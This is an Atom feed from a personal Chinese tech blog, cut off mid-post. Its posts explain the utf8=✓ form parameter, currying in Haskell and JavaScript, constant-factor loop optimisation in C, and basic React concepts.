<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Ivan&#39;s Blog</title>
  <subtitle>Web前端 &amp; 极客 &amp; 渗透</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://blog.yfgeek.com/"/>
  <updated>2017-03-08T19:05:11.000Z</updated>
  <id>http://blog.yfgeek.com/</id>
  
  <author>
    <name>Ivan</name>
    <email>yifanb@gmail.com</email>
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>揭秘utf8=✓背后的小秘密</title>
    <link href="http://blog.yfgeek.com/2017/02/17/utf8true/"/>
    <id>http://blog.yfgeek.com/2017/02/17/utf8true/</id>
    <published>2017-02-17T16:51:18.000Z</published>
    <updated>2017-03-08T19:05:11.000Z</updated>
    
    <content type="html"><![CDATA[<p>你可能和我一样疑惑，为什么github等网站，在POST数据的时候，经常带有<code>utf8=✓</code>字符，显然这种方式看起来很难以接受，因为Unicode编码错误的话会导致很多问题，毕竟用户的浏览器是不一样的。</p>
<p>为什么不用<code>utf8=true</code>来代替呢？</p>
<p>答案恰恰相反！</p>
<p><code>utf8=✓</code>就是为了让浏览器在POST数据时强制使用utf-8的编码方式，进而在后端代码中无需考虑字符串编码转换问题，以免带来困扰。</p>
<p>在IE8，或者更早的IE浏览器里，在POST数据时，会尽可能的POST以Latin-1编码方式的字符串，这给后端带来了巨大的兼容性的困扰，但是你一旦在POST数据中包含了✓这样的Unicode字符，就会自动用uft8的编码方式发送字符串。</p>
<p>是不是很有用的小技巧呢？</p>
<p>本文翻译自:<a href="http://softwareengineering.stackexchange.com/questions/168751/is-the-use-of-utf8-preferable-to-utf8-true" target="_blank" rel="external">Is the use of “utf8=✓” preferable to “utf8=true”?</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;你可能和我一样疑惑，为什么github等网站，在POST数据的时候，经常带有&lt;code&gt;utf8=✓&lt;/code&gt;字符，显然这种方式看起来很难以接受，因为Unicode编码错误的话会导致很多问题，毕竟用户的浏览器是不一样的。&lt;/p&gt;
&lt;p&gt;为什么不用&lt;code&gt;utf8=t
    
    </summary>
    
      <category term="Web" scheme="http://blog.yfgeek.com/categories/Web/"/>
    
    
      <category term="Web" scheme="http://blog.yfgeek.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>浅谈函数式编程柯里化</title>
    <link href="http://blog.yfgeek.com/2017/02/11/currying/"/>
    <id>http://blog.yfgeek.com/2017/02/11/currying/</id>
    <published>2017-02-11T18:27:57.000Z</published>
    <updated>2017-03-08T19:05:11.000Z</updated>
    
    <content type="html"><![CDATA[<p>百度百科里对柯里化的定义是</p>
<blockquote>
<p>在计算机科学中，柯里化（Currying）是把接受多个参数的函数变换成接受一个单一参数(最初函数的第一个参数)的函数，并且返回接受余下的参数且返回结果的新函数的技术。这个技术由 Christopher Strachey 以逻辑学家 Haskell Curry 命名的，尽管它是 Moses Schnfinkel 和 Gottlob Frege 发明的。</p>
</blockquote>
<p>简直看不懂哦，Talk is Cheap，我们拿一个简单的haskell程序说明什么叫</p>
<h2 id="自动柯里化"><a href="#自动柯里化" class="headerlink" title="自动柯里化"></a>自动柯里化</h2><p>两数相加，返回结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">fun add x y = x + y</div></pre></td></tr></table></figure>
<p>这是一个典型的柯里化的版本，当我输入 <code>(add 1) 2</code> 时与<code>add 1 2</code> 的返回结果一模一样，都是3</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="type">Prelude</span>&gt; (add <span class="number">1</span>) <span class="number">2</span></div><div class="line"><span class="number">3</span></div></pre></td></tr></table></figure>
<p>但是，换个角度上讲，我明明设置了两个“变量”，在haskell里却把它们的结果又封装成了一个函数，这就是haskell的强大特性：自动柯里化，haskell全部帮你自动处理了。</p>
<p>简单来说，柯里化指的是函数里只接收一个余下的参数，再调用原函数，返回出相应的结果。</p>
<p>而同样的，没有柯里化的普通版本却是这样的：</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="title">fun</span> add(x, y) = x + y</div></pre></td></tr></table></figure>
<p>这个版本里，只能通过<code>add(1,2)</code>进行相加操作。</p>
<p>柯里化实际上是将高阶函数进行降阶处理，没理解？接着看~ </p>
<h2 id="JavaScript的柯里化"><a href="#JavaScript的柯里化" class="headerlink" title="JavaScript的柯里化"></a>JavaScript的柯里化</h2><p>JavaScript存在<strong>闭包</strong>的特性，能够很好的为我们将函数柯里化，但是很可惜JavaScript不支持自动柯里化，这意味着，我们要自己写柯里化的过程，不过还好，这能有效的让我们理解，到底什么是柯里化。</p>
<p>同样的，还是那个add的简单函数，用JavaScript实现如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">x, y</span>)</span>&#123;</div><div class="line">	<span class="keyword">if</span>(y===<span class="literal">undefined</span>)&#123;</div><div class="line">		<span class="keyword">return</span> <span class="function">(<span class="params">z</span>) =&gt;</span> x + z;</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		<span class="keyword">return</span> x+y;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>测试一下！通过执行<code>add(1)(2)</code>，果然返回了<code>3</code>，是的，这是一个手动构造柯里化函数的过程。对于大多数函数，我们有通用的柯里化方法：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">curry</span>(<span class="params">func</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> fixedArgs = [].slice.call(<span class="built_in">arguments</span>,<span class="number">1</span>);</div><div class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    args = fixedArgs.concat([].slice.call(<span class="built_in">arguments</span>))</div><div class="line">    <span class="keyword">return</span> func.apply(<span class="literal">null</span>, args);</div><div class="line">  &#125;;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>也就是说，对于<code>add</code>函数来说，我们用一个函数生成了另一个范围更小的函数，一层接一层的解决问题。这符合函数式编程的思想，就是我们更关注<strong>函数</strong>与<strong>函数</strong>之间的关系，而非状态本身，更在乎局部而非整体。</p>
<p>这个例子体现不出这种思想的精妙之处，那么我们再举一个例子🌰</p>
<p>如果，我们想让一个已知的数组每个值都做加1操作，传统的方法该怎么做？</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">let</span> ar = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</div><div class="line">ar.map(<span class="function">(<span class="params">x</span>)=&gt;</span> x+<span class="number">1</span>);</div></pre></td></tr></table></figure>
<p>对吧？那么我们下面可以用柯里化的思想把这个问题实现：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> add = <span class="function"><span class="params">ar</span> =&gt;</span> ar.map(<span class="function"><span class="params">x</span> =&gt;</span> x + <span class="number">1</span>);</div><div class="line">add([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]);</div></pre></td></tr></table></figure>
<p>首先我们在<code>add</code>里定义了一个函数，并且传入参数为<code>ar</code>，<code>ar</code>进行<code>Array.prototype.map()</code>操作，对每一个数进行遍历，并且返回这个数字+1后的值给<code>ar</code>，这看起来挺玄乎的，但确实可行，我们只关心局部，请试图把<code>add</code>当做数学里中的函数去思考理解，或许会好懂的多。可是这只是方便了我们理解，那么到底有什么好处呢？</p>
<p>再举一个例子🌰</p>
<p>如果我们想写一个函数，用来对已知数组的已知量进行相加n的操作，怎么写？传统方法</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">let</span> ar= [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">addToArray</span>(<span class="params">ar,n</span>)</span>&#123;</div><div class="line">  <span class="keyword">return</span> ar.map(<span class="function">(<span class="params">x</span>)=&gt;</span> x+n)</div><div class="line">&#125;;</div><div class="line"><span class="built_in">console</span>.log(addToArray(ar,<span class="number">1</span>));</div></pre></td></tr></table></figure>
<p>但是，我们可以这样写：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> add = <span class="function"><span class="params">a</span> =&gt;</span> b =&gt; a+b;</div><div class="line"><span class="keyword">const</span> addToArray = <span class="function">(<span class="params">ar,n</span>) =&gt;</span> ar.map(add(n));</div><div class="line">addToArray([<span class="number">2</span>,<span class="number">3</span>],<span class="number">1</span>)</div></pre></td></tr></table></figure>
<p>结果都一样，其实过程是不一样的，你可能真的憋不住了，到底有什么用呢？</p>
<h1 id="柯里化的好处"><a href="#柯里化的好处" class="headerlink" title="柯里化的好处"></a>柯里化的好处</h1><p>就像上面的例子一样，你能看出不同吗？对，第一个的实质是新写了一个函数，对数组进行map操作，而第二个则是在直接在<code>map</code>里进行<code>add</code>操作，这很通用，一旦你写了很多类似于<code>add</code>的函数，就会方便起来，可以让我们方便的在<code>map</code>,<code>reduce</code>,<code>filter</code>里调用。</p>
<ul>
<li>能够进行延迟计算，就像add(1)(2)一样，1比2先传入，2就会被延迟计算，在特定的场景里，有一定的应用意义。</li>
<li>当你发现你要调用一个函数，并且调用参数都是一样的情况下，这个参数就可以被柯里化，以便更好的完成任务。</li>
<li>优雅的写法，允许你写出来的代码更干净、更有表达力。</li>
</ul>
<p>虽然柯里化在日常应用不多，但仍然是一个不可不了解的好概念。</p>
<h1 id="相关阅读"><a href="#相关阅读" class="headerlink" title="相关阅读"></a>相关阅读</h1><p><a href="https://cnodejs.org/topic/56261a249b48ca9448b776c4" target="_blank" rel="external"> JavaScript柯里化</a></p>
<p><a href="http://codekirei.com/posts/currying-with-arrow-functions/" target="_blank" rel="external">Currying and ES6 Arrow Functions</a></p>
<p><a href="http://www.cnblogs.com/zztt/p/4142891.html" target="_blank" rel="external">浅析 JavaScript 中的 函数 currying 柯里化</a></p>
<p><a href="https://www.youtube.com/watch?v=iZLP4qOwY8I" target="_blank" rel="external">Currying - Part 6 of Functional Programming in JavaScript(需梯子)</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;百度百科里对柯里化的定义是&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在计算机科学中，柯里化（Currying）是把接受多个参数的函数变换成接受一个单一参数(最初函数的第一个参数)的函数，并且返回接受余下的参数且返回结果的新函数的技术。这个技术由 Christopher St
    
    </summary>
    
      <category term="Web" scheme="http://blog.yfgeek.com/categories/Web/"/>
    
    
      <category term="Web" scheme="http://blog.yfgeek.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>什么才是优秀的程序代码</title>
    <link href="http://blog.yfgeek.com/2017/02/08/awesome-code/"/>
    <id>http://blog.yfgeek.com/2017/02/08/awesome-code/</id>
    <published>2017-02-08T17:35:13.000Z</published>
    <updated>2017-03-08T19:05:11.000Z</updated>
    
    <content type="html"><![CDATA[<p>首先，我想说的是，我谈及的“优秀程序代码”，不是指“优秀程序”，也不是更易阅读的“代码”，恰恰相反，我可能想写的是更不易阅读的代码，这里的“优秀”指的是高效、快速。</p>
<p>在写之前，我想先用一个原则引入这个文章：</p>
<blockquote>
<p><strong>KISS原则</strong>  <strong>*K</strong>eep <strong>I</strong>t <strong>S</strong>imple, <strong>S</strong>tupid* </p>
</blockquote>
<p>是的，这是我心中优秀的代码程序，就是简单、高效。</p>
<p>相信所有人都知道时间复杂度这个东西，是的，优秀的代码永远都在做一件事：降低时间复杂度，哪怕写的过程是复杂的、理解起来是相对难的(比如，快速排序、堆排序)。那么，我接下来，想较一下真。</p>
<h1 id="卡常数"><a href="#卡常数" class="headerlink" title="卡常数"></a>卡常数</h1><blockquote>
<p>据考证，[卡]（Qa’a）是古埃及第一王朝的最后一位法老。</p>
<p>他发现并研究了一种常数，后世以他的名字叫做卡常数。卡特兰数的起源也是因为卡的后人与特兰克斯结婚，生下来的孩子就叫卡特兰，而他只是发表了祖传的家书而已。</p>
<p>Sereja也是卡的后人，提出括号序列问题，也是从家书里得到的资料。然而Sereja为了不让这个秘密公开，于是隐瞒了这道题的真正做法。可是由于卡的后人不是各个都像卡特兰一样爱慕虚荣，这一算法也无法找到。“欲见贤人而不以其道，犹欲其入而闭之门也”。卡之常数的奥秘，需要以一颗诚心去追寻。</p>
</blockquote>
<p>看不懂对吗？</p>
<p>我也看不懂，因为这是一群高中生写的。按照我的理解，卡常数，就是内循环里的那些看似不重要的语句其实每一句话的运行速度是不一样的，这个客观规律，是真实存在的，举个栗子🌰</p>
<p>程序1</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= K; i++)</div><div class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= K; j++)</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt;= K; k++) &#123; </div><div class="line">      r.a[i][j] += a[i][k] * x.a[k][j];</div><div class="line">      <span class="keyword">if</span> (r.a[i][j] &gt;= <span class="number">1l</span>l &lt;&lt; <span class="number">62</span> || k == K) r.a[i][j] %= mod;</div><div class="line">   &#125;</div></pre></td></tr></table></figure>
<p>程序2</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= K; i++)</div><div class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= K; j++)</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt;= K; k++)</div><div class="line">      r.a[i][j] = (r. a[i][j] + a[i][k] * x.a[k][j] % mod) % mod;</div></pre></td></tr></table></figure>
<p>按照常人的理解，<code>程序1</code>和<code>程序2</code>的复杂度都是O(n^3)，没错，那么他们的时间是一样的吗？</p>
<p>并不一样。</p>
<p>在机器性能并没有那么高的情况下，在测试数据量没有那么少的情况下，第二种比第一种快了一倍。</p>
<p><strong>为什么？</strong></p>
<p>因为第二种代码更加精炼吗？并不完全是。</p>
<p>在<code>程序1</code>中，<code>if (r.a[i][j] &gt;= 1ll &lt;&lt; 62 || k == K)</code>实际上是耗费时间的，if操作在执行的时候真实的操作是这样的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(这里面是<span class="literal">true</span>吗？)</div><div class="line">  左边是<span class="literal">true</span>吗？</div><div class="line">  右边是<span class="literal">true</span>吗？</div><div class="line">  ||操作是<span class="literal">true</span>吗？</div></pre></td></tr></table></figure>
<p>这必然会消耗大量的时间，同理</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">r.a[i][j] += a[i][k] * x.a[k][j];</div><div class="line">r.a[i][j] = a[i][k] * x.a[k][j] + r.a[i][j];</div></pre></td></tr></table></figure>
<p>一样吗？实际上是不一样的，后者比前者快一点。</p>
<p>你可能觉得，这也太较真了吧？但是高效就是高效，效率提高才是硬道理。</p>
<blockquote>
<p>不积跬步，无以至千里；不积小流，无以成江海。</p>
</blockquote>
<h1 id="原则"><a href="#原则" class="headerlink" title="原则"></a>原则</h1><ul>
<li><p>一杆内存在心中</p>
</li>
<li><p>多写一个不必要的循环递归，浑身难受</p>
</li>
<li><p>多写一个不必要的逻辑判断，浑身难受</p>
</li>
<li><p>多写一个无关变量，浑身难受</p>
</li>
<li><p>不找到最优解，浑身难受</p>
</li>
<li><p>始终自发的想着如何用栈、树去解决问题</p>
</li>
<li><p>代码效率哪怕提升的是一倍，花一天优化代码也是值得的</p>
</li>
<li><p>时刻遵循RP定律写代码，RP++</p>
</li>
</ul>
<p>我从我接触OI那一刻起，我觉得算法是美的，每一个人写出来的算法都体现了一种算法，永远对高效快速的低复杂度的精炼代码充满敬畏之心！❤️</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;首先，我想说的是，我谈及的“优秀程序代码”，不是指“优秀程序”，也不是更易阅读的“代码”，恰恰相反，我可能想写的是更不易阅读的代码，这里的“优秀”指的是高效、快速。&lt;/p&gt;
&lt;p&gt;在写之前，我想先用一个原则引入这个文章：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;stron
    
    </summary>
    
      <category term="CodeStyle" scheme="http://blog.yfgeek.com/categories/CodeStyle/"/>
    
    
      <category term="CodeStyle" scheme="http://blog.yfgeek.com/tags/CodeStyle/"/>
    
  </entry>
  
  <entry>
    <title>我眼中的React</title>
    <link href="http://blog.yfgeek.com/2017/02/04/react/"/>
    <id>http://blog.yfgeek.com/2017/02/04/react/</id>
    <published>2017-02-04T14:35:03.000Z</published>
    <updated>2017-03-08T19:05:11.000Z</updated>
    
    <content type="html"><![CDATA[<p>前两天，用React把 之前的 <a href="https://github.com/yfgeek/rpi-TempRuntime" target="_blank" rel="external">基于树莓派3B,DHT11/DHT22,LCD1602的一个实时温度湿度检测系统</a> 的Web部分重构了一下。</p>
<p>这个项目之前是用Semantic UI + eCharts + JQuery Datapicker写的，由于这个项目的实现过程比较经典，几乎把所有的感觉React的基础思想都实现了一遍。</p>
<p>无疑，React给前端带来了各种新的想法与思想，声明式、虚拟Dom、单向数据流、JSX、组件化、Flux、以JavaScript为中心、React Native。</p>
<p><img src="/content/images/react/0.png" alt=""></p>
<h1 id="虚拟Dom"><a href="#虚拟Dom" class="headerlink" title="虚拟Dom"></a>虚拟Dom</h1><p>React是以JS为中心的，而非HTML，虚拟Dom是一个至关重要的概念。</p>
<p>在jQuery出现之前，我们一般都是直接操作Dom，方法“暴力、简单”，也存在兼容性的问题。在jQuery出现之后，jQuery的选择器帮助我们简单、高效的操作Dom，也就是在jQuery出现之后，前端就开始大爆发了。</p>
<p>但是随着发展，这种简单暴力的操作Dom的方法对于很多大型系统性工程来说，从软件工程的角度上讲，是杂乱、无序的，一旦时间久远，项目越来越大，维护成本就变大。于是，我们有了各种前端MVC、MVVM框架，典型的有Angular、React、vue.js，MVVM给我们带来一种全新的思想，数据绑定。</p>
<p>不过，与此同时，React给我们带来了一种全新的思想，虚拟Dom，从此，我们再也不用直接操作Dom了，而是用虚拟Dom更新Dom。</p>
<p>你可能会问，这样做，效率岂不是更低了？</p>
<p>是的，也不是。其实没有那么明显，一般来讲，操作Dom树的Diff算法应该是O(n^3)，而React把效率降低到了O(n)。</p>
<p><img src="/content/images/react/1.png" alt=""></p>
<p>简单来讲，如图所示，React只会比较相同层级的Dom，从而简化了Dom Diff的复杂度，虽然有所舍弃，但是全局比较是没有必要的。</p>
<p>通过在JSX文件中写虚拟Dom，React在内存中会自动拿现在的虚拟Dom和旧的虚拟Dom进行Diff操作，如果发现有Diff的部分，就拿出来形成新的Patch部分，加入到现在的Dom树上。</p>
<p>也就是因为这个原因，虚拟Dom使得在操作Dom上更加高效，每次更新数据不会进行O(n^3)复杂的操作。</p>
<p>你可能会问，什么是JSX？</p>
<h1 id="JSX"><a href="#JSX" class="headerlink" title="JSX"></a>JSX</h1><p>其实JSX只是一种未编译的JavaScript，可以方便的对HTML进行书写，先上代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span>;</div><div class="line"><span class="keyword">import</span> &#123; Button &#125; <span class="keyword">from</span> <span class="string">'semantic-ui-react'</span>;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">ButtonComponent</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</div><div class="line">    render() &#123;</div><div class="line">        <span class="keyword">return</span>(</div><div class="line">            <span class="xml"><span class="tag">&lt;<span class="name">span</span>&gt;</span></span></div><div class="line">            <span class="tag">&lt;<span class="name">Button</span> <span class="attr">color</span>=<span class="string">'blue'</span> &gt;</span>分钟<span class="tag">&lt;/<span class="name">Button</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">Button</span> <span class="attr">color</span>=<span class="string">'violet'</span>&gt;</span>小时<span class="tag">&lt;/<span class="name">Button</span>&gt;</span></div><div class="line">            <span class="tag">&lt;/<span class="name">span</span>&gt;</span></div><div class="line">        );</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">export</span> <span class="keyword">default</span> ButtonComponent;</div></pre></td></tr></table></figure>
<p>代码部分用<code>ES6</code>书写，你可能会问什么是ES6？其实还有ES7(ECMAScript 2016)呢~</p>
<p>那么，你可能看到了很变态的写法，就是HTML和JS混写，没错，这就是EJS，但请注意，这不是HTML，写着写着很有可能会掉入<a href="http://www.css88.com/react/docs/jsx-gotchas.html" target="_blank" rel="external">JSX陷阱</a>。</p>
<p>经过<code>babel</code>等工具的编译后，JSX在运行的时候会被编译为真实的JavaScript语言，之所以这样写，只是为了方便程序员更方便的写代码。</p>
<p>比如上面的代码“HTML部分”会被编译为：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">React.createElement(<span class="string">'button'</span>, &#123;<span class="attr">class</span>: <span class="string">'ui blue button'</span>&#125;, <span class="string">'分钟'</span>);</div><div class="line">React.createElement(<span class="string">'button'</span>, &#123;<span class="attr">class</span>: <span class="string">'ui violet button'</span>&#125;, <span class="string">'小时'</span>);</div></pre></td></tr></table></figure>
<p>当然，JSX也有很多坑，比如：</p>
<p><code>Module build failed: SyntaxError: Adjacent JSX elements must be wrapped in an enclosing tag</code></p>
<p>作为新手，这个问题，我经常遇到，因为你在写每一个JSX模块的时候，你需要用类似于<code>&lt;div&gt;&lt;/div&gt;</code>作为开始与结尾，不规范的代码不会被编译成功。</p>
<h1 id="ECMAScript-ES"><a href="#ECMAScript-ES" class="headerlink" title="ECMAScript(ES)"></a>ECMAScript(ES)</h1><p>ES无疑是这几年最火的前端语言，没错，他是JavaScript的改进版，我知道，其实还有很多其他类似的比如CoffeeScript，但是ES会被各大浏览器所兼容支持，但是你可能会问到兼容性问题，没事，我们有<code>babel</code>工具。</p>
<ul>
<li>ECMAScript：一个由 ECMA International 进行标准化，TC39 委员会进行监督的语言。通常用于指代标准本身。</li>
<li>JavaScript：ECMAScript 标准的各种实现的最常用称呼。这个术语并不局限于某个特定版本的 ECMAScript 规范，并且可能被用于任何不同程度的任意版本的 ECMAScript 的实现。</li>
<li>ECMAScript 5 (ES5)：ECMAScript 的第五版修订，于 2009 年完成标准化。这个规范在所有现代浏览器中都相当完全的实现了。</li>
<li>ECMAScript 6 (ES6) / ECMAScript 2015 (ES2015)：ECMAScript 的第六版修订，于 2015 年完成标准化。这个标准被部分实现于大部分现代浏览器。可以查阅这张兼容性表来查看不同浏览器和工具的实现情况。</li>
<li>ECMAScript Proposals：被考虑加入未来版本 ECMAScript 标准的特性与语法提案，他们需要经历五个阶段：Strawman（稻草人），Proposal（提议），Draft（草案），Candidate（候选）以及 Finished （完成）。</li>
<li>ECMAScript 2016：第七版 ECMAScript 修订，增加了两个新特性。</li>
</ul>
<p>以上，都是我们常说的ES，在网上看到的代码目前以ES5和ES6居多，写法各异，我建议用最新版的写法写代码。</p>
<p>说白了，就是Javascript并不是一个优秀的语言，但是经过不断的填补，修正，已经让Javascript支持了很多新特性，新的语法，更多的书写方式，以及拥有了更严谨的编程思想。比如<code>let</code>,arrow function(就是这个：<code>(i) =&gt; i + 1</code> )在ES中的运用等。</p>
<p>所以，在认识React之前，最好学习ES的新特性以及<a href="http://blog.csdn.net/zhangjjie0110/article/details/53782537" target="_blank" rel="external">常用的新特性</a>。</p>
<h1 id="组件化"><a href="#组件化" class="headerlink" title="组件化"></a>组件化</h1><p>我觉得这是React的重量级思想，组件化前端，从此，前端再也不是东拼西凑，而是像积木一样，拼起来。</p>
<p><img src="/content/images/react/2.png" alt=""></p>
<p>React把单一的用户界面，拆成了各种各样的组件，形成“组件树”，采用分而治之的思想，有一个好处，就是维护起来极其方便，对于组件的修改也显得很容易。</p>
<h1 id="数据绑定"><a href="#数据绑定" class="headerlink" title="数据绑定"></a>数据绑定</h1><p>众所周知，Angular是双向数据绑定的，并且引以为豪，因为更容易维护与理解。</p>
<p>但是双向数据绑定也带来了许多问题，会在些其他功能的时候莫名其妙出现很多bug。</p>
<p>React是单向数据绑定的，是非常稳定的做法，但是也存在一些问题，就是在操作其他组件的时候，对于数据流的处理，显得异常困难。</p>
<p>在React中，数据绑定仅仅需要在<code>render</code>中写<code>{数据绑定}</code>，而非像Angular一样，两边都要设置，一定情况下讲，这是比较方便的。</p>
<h1 id="数据模型"><a href="#数据模型" class="headerlink" title="数据模型"></a>数据模型</h1><h2 id="state"><a href="#state" class="headerlink" title="state"></a>state</h2><p>话说回来，React的每一个组件的实质是什么？状态机（State Machines），在React的每一个组件里，通过更新<code>this.state</code>，再通过<code>render()</code>进行渲染，React会自动把最新的状态渲染到网页上。</p>
<p>举个栗子🌰<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">DateSelectorComponent</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">constructor</span>(props) &#123;</div><div class="line">    <span class="keyword">super</span>(props);</div><div class="line">    <span class="keyword">let</span> todaydate = <span class="keyword">this</span>.showLocale(<span class="keyword">new</span> <span class="built_in">Date</span>());</div><div class="line">     <span class="keyword">this</span>.state = &#123;</div><div class="line">         <span class="attr">timenow</span>: todaydate,</div><div class="line">         <span class="attr">showCalendar</span>: <span class="literal">false</span></div><div class="line">    &#125;</div><div class="line">            <span class="keyword">return</span>(</div><div class="line">            <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></div><div class="line">            <span class="tag">&lt;<span class="name">Input</span> <span class="attr">icon</span>=<span class="string">'calendar'</span> <span class="attr">iconPosition</span>=<span class="string">'left'</span> <span class="attr">readOnly</span> <span class="attr">onClick</span>=<span class="string">&#123;this.showCalendar&#125;</span> <span class="attr">value</span>=<span class="string">&#123;this.state.timenow&#125;</span> <span class="attr">ref</span>=<span class="string">"inputbox"</span>/&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">ButtonComponent</span> /&gt;</span></div><div class="line">            &#123;CalendarComponent&#125;</div><div class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">        )</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>通过这样的方式，我就设置了state的默认初始值，默认日历选择器是不出现的，而今天的日期是今天日期，这很正常。然后在将所谓的值渲染到Dom上。</p>
<h2 id="props"><a href="#props" class="headerlink" title="props"></a>props</h2><p>React的数据流是单向的，是自上向下的层级传递的，props可以对固定的数据进行传递。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloMessage</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</div><div class="line">  render( </div><div class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello &#123;this.props.name&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>;</div><div class="line">    )</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">MainPage</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</div><div class="line">render()&#123;</div><div class="line"> <span class="keyword">return</span>(</div><div class="line">  <span class="xml"><span class="tag">&lt;<span class="name">HelloMessage</span> <span 